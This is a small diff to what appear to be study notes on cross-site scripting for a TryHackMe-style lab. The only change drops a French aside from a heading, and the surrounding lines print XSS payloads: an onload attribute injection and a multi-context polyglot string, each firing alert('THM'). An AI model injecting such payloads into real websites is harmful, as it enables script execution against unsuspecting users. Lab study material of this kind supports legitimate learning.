@@ -88,7 +88,7 @@ Some payloads :
     onload="alert('THM'); (when inside an image tag and "<" ">" are filtered
     
 
-Polyglot (c'est OP)
+Polyglot
 
     jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/-       -!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 
